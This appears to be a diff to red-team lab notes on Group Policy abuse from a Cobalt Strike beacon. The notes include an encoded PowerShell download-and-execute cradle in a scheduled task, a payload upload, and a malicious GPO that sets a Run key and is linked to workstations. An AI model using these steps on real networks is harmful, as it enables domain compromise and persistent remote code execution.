@@ -38,3 +38,33 @@
 8. Use sharpGPOAbuse to add the backdoor (scheduled task) for execution on targetted system
 
         beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "C:\Windows\System32\cmd.exe" --Arguments "/c powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAHAAaQB2AG8AdAAiACkAKQA=" --GPOName "Vulnerable GPO"
+
+## Create and Link new GPO
+
+1. Check the rights to create a new GPO in Domain
+
+        beacon> powerpick Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
+
+2. Find the OU where any principal has "Write gPlink Privilege"
+
+        beacon> powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
+
+        beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
+        DEV\Developers
+
+3. Verify if RSAT module is installed for GPO abuse
+
+        beacon> powerpick Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
+
+4. Create a new GPO & configure it to execute attacker binary via Registry loaded from shared location
+
+        beacon> powerpick New-GPO -Name "Evil GPO"
+
+        beacon> powerpick Find-DomainShare -CheckShareAccess
+        beacon> cd \\dc-2\software
+        beacon> upload C:\Payloads\pivot.exe
+        beacon> powerpick Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe" -Type ExpandString
+
+5. Link newly created GPO with OU
+
+        beacon> powerpick Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
